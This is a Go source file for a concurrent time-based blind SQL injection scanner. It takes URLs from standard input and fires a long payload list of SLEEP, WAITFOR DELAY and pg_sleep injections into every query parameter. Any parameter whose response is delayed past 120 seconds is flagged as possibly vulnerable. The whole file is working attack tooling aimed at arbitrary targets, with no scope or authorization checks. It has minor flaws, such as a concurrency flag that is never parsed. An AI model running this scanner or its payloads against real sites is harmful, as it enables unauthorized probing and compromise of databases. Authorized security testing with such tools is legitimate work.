package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sync"
	"time"
)

var sql_payloads = []string{
	"sleep(120)#",
	"1 or sleep(120)#",
	"\" or sleep(120)#",
	"' or sleep(120)#\"",
	"\" or sleep(120)=",
	"' or sleep(120)='",
	"1) or sleep(120)#",
	"\") or sleep(120)=\"",
	"') or sleep(120)='",
	"1)) or sleep(120)#",
	"\")) or sleep(120)=\"",
	"')) or sleep(120)='",
	";waitfor delay '0:0:120'--",
	");waitfor delay '0:0:120'--",
	"';waitfor delay '0:0:120'--",
	"\";waitfor delay '0:0:120'--",
	"');waitfor delay '0:0:120'--",
	"\");waitfor delay '0:0:120'--",
	"));waitfor delay '0:0:120'--",
	"'));waitfor delay '0:0:120'--",
	"\"));waitfor delay '0:0:120'--",
	"pg_sleep(5)--",
	"1 or pg_sleep(120)--",
	"\" or pg_sleep(120)--",
	"' or pg_sleep(120)--",
	"1) or pg_sleep(120)--",
	"\") or pg_sleep(120)--",
	"') or pg_sleep(120)--",
	"1)) or pg_sleep(120)--",
	"\")) or pg_sleep(120)--",
	"')) or pg_sleep(120)--",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))bAKL) AND 'vRxe'='vRxe",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))YjoC) AND '%'='",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))nQIP)",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))nQIP)--",
	"AND (SELECT * FROM (SELECT(SLEEP(120)))nQIP)#",
	"SLEEP(120)#",
	"SLEEP(120)--",
	"SLEEP(120)=",
	"SLEEP(120)='",
	"or SLEEP(120)",
	"or SLEEP(120)#",
	"or SLEEP(120)--",
	"or SLEEP(120)=",
	"or SLEEP(120)='",
	"waitfor delay '00:00:120'",
	"waitfor delay '00:00:120'--",
	"waitfor delay '00:00:120'#",
	"pg_SLEEP(120)",
	"pg_SLEEP(120)--",
	"pg_SLEEP(120)#",
	"or pg_SLEEP(120)",
	"or pg_SLEEP(120)--",
	"or pg_SLEEP(120)#",
	"'\"",
	"AnD SLEEP(120)",
	"AnD SLEEP(120)--",
	"AnD SLEEP(120)#",
	"&&SLEEP(120)",
	"&&SLEEP(120)--",
	"&&SLEEP(120)#",
	"' AnD SLEEP(120) ANd '1",
	"'&&SLEEP(120)&&'1",
	"ORDER BY SLEEP(120)",
	"ORDER BY SLEEP(120)--",
	"ORDER BY SLEEP(120)#",
	"(SELECT * FROM (SELECT(SLEEP(120)))ecMj)",
	"(SELECT * FROM (SELECT(SLEEP(120)))ecMj)#",
	"(SELECT * FROM (SELECT(SLEEP(120)))ecMj)--",
	"+ SLEEP(120) + '",
	"SLEEP(120)/*' or SLEEP(120) or '\" or SLEEP(120) or \"*/",
}

func CheckContains(url_t string) bool {
	re := regexp.MustCompile(`\?\w+=.+`)
	matched := re.MatchString(url_t)
	if matched {
		return true
	} else {
		return false
	}
}

func TestOneByOneSQLi(url_t string, name string, wg *sync.WaitGroup, sem chan bool) {
	defer wg.Done()
	<-sem
	payloads := url.Values{}
	var new_url string
	for _, sql_payload := range sql_payloads {
		payloads.Set(name, sql_payload)
		encoded_payloads := payloads.Encode()
		if CheckContains(url_t) {
			new_url = fmt.Sprintf("%s&%s", url_t, encoded_payloads)
		} else {
			new_url = fmt.Sprintf("%s?%s", url_t, encoded_payloads)
		}
		start := time.Now()
		_, err := http.Get(new_url)
		if err != nil {
			continue
		} else {
			if time.Since(start).Seconds() > 120 {
				fmt.Printf("Possibly vulnerable to SQLi ---> %s\n%s\n%s", url_t, name, sql_payload)
			}
		}
	}

}
func main() {
	reader := bufio.NewScanner(os.Stdin)
	var wg sync.WaitGroup
	conc := flag.Int("concurrency", 10, "concurrency level")
	sem := make(chan bool, *conc)
	for reader.Scan() {
		url_t := reader.Text()
		parsedUri, _ := url.Parse(url_t)
		query, _ := url.ParseQuery(parsedUri.RawQuery)
		for name := range query {
			wg.Add(1)
			sem <- true
			go TestOneByOneSQLi(url_t, name, &wg, sem)
		}
	}
	for i := 0; i < cap(sem); i++ {
		sem <- true
	}
	wg.Wait()
}
